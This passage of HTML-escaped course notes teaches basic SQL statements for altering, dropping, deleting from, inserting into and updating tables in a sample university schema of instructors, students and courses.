&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Existing tuples in &lt;code&gt;r&lt;/code&gt; will have &lt;code&gt;null&lt;/code&gt; as the value for the new attribute&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;alter&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;r&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;drop&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;A&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Not supported on many databases like &lt;code&gt;SQLite&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;alter&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;r&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;rename&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;column&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;old_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;to&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;new_name&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;alter&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;r&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;modify&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;A&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;data_typ&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;deleting-a-table&#34; &gt;Deleting a Table
&lt;span&gt;
    &lt;a href=&#34;#deleting-a-table&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;drop&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;removing-from-table&#34; &gt;Removing from Table
&lt;span&gt;
    &lt;a href=&#34;#removing-from-table&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Remove all:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;delete&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;delete&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Finance&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;details&gt;&lt;summary&gt;Delete instructors who earn less than the average&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;delete&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;br&gt;
&lt;h4 id=&#34;insertion&#34; &gt;Insertion
&lt;span&gt;
    &lt;a href=&#34;#insertion&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;into&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;values&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;CS-&lt;span style=&#34;color:#3677a9&#34;&gt;437&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;Database&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Systems&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Comp.&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Sci.&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;into&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(course_id,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;title,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;credits)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;values&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;CS-&lt;span style=&#34;color:#3677a9&#34;&gt;437&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;Database&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Systems&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Comp.&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Sci.&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;into&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;student&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;values&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;3003&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Green&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Finance&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;null&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;into&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;student&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;values&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;3003&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Green&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Finance&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* omitted values will be null */&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inserting into new table from another based on some condition. Note that without
a primary key on the student table, there would be a infinite tuples added.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;into&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ID,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;18000&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;student&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Music&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;total_cred&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;144&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;updates&#34; &gt;Updates
&lt;span&gt;
    &lt;a href=&#34;#updates&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;update&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#3677a9&#34;&gt;05&lt;/span&gt;;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;update&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#3677a9&#34;&gt;05&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;70000&lt;/span&gt;;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;update&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;set&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#3677a9&#34;&gt;05&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;lt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor);&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Update instructor salaries based on how much they make (multiple queries):&lt;/p&gt;
